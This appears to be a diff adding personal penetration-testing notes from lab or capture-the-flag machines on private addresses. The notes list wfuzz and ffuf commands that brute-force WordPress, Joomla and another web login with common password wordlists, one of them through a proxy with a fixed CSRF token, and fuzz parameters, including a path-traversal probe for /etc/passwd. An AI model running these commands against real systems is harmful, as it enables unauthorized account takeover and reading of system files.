@@ -1,0 +1,42 @@
+ wfuzz -c -v -z file,/usr/share/wordlists/rockyou.txt  -d "key=FUZZ" --hs "invalid key"  http://192.168.56.41/kzMb5nVYJw/index.php
+
+
+
+wordpress username and passwrord bruteforce...
+
+Password --->
+
+wfuzz -c -z file,uniqe.txt --hs ERROR -d "log=Elliot&pwd=FUZZ" http://192.168.56.17/wp-login.php 
+
+
+Username---->
+
+wfuzz -c -z file,fsocity.dic --hs Invalid -d "log=FUZZ&pwd=a" http://192.168.56.17/wp-login.php
+
+Password Using proxy and csrf constant tocken...
+
+wfuzz -c -z file,/usr/share/wordlists/10kpass.txt  -p localhost:8080  --hs "incorrect" -d "_csrf=uglYlbVKYDqhG93BFeAosvQ3inQ6MTYxOTc4MTQ2NjU5NDAyNjQxNA&user_name=frank&password=FUZZ" http://devguru.local:8585/user/login
+
+Username and password both with proxy as burp....
+
+wfuzz -c -z file,wp_users  -z file,/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -p 127.0.0.1:8080 --hs ERROR -d "log=FUZZ&pwd=FUZ2Z" http://192.168.56.47/backup_wordpress/wp-login.php
+
+with hiding lengh of the result...
+
+wfuzz -c -z file,wp_users  -z file,/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --hl 71   -d "log=FUZZ&pwd=FUZ2Z" http://192.168.56.47/backup_wordpress/wp-login.php 
+
+
+ffuf bruteforce username and password Post request:
+
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -w /usr/share/wordlists/rockyou.txt  -u http://192.168.207.130/joomla/administrator/index.php  -X POST -d "username=FUZZ\&password=FUZ2Z" -fw 214 
+
+
+
+Parameter fuzzing wigh WFUZZ...
+
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hw 12 "http://192.168.207.132/index.php?FUZZ=something"
+
+Or with ffuf....
+
+ffuf -c -w /usr/share/wfuzz/wordlist/general/common.txt -fw 8 -u "http://192.168.207.132/index.php?FUZZ=../../../../../../etc/passwd" 
+
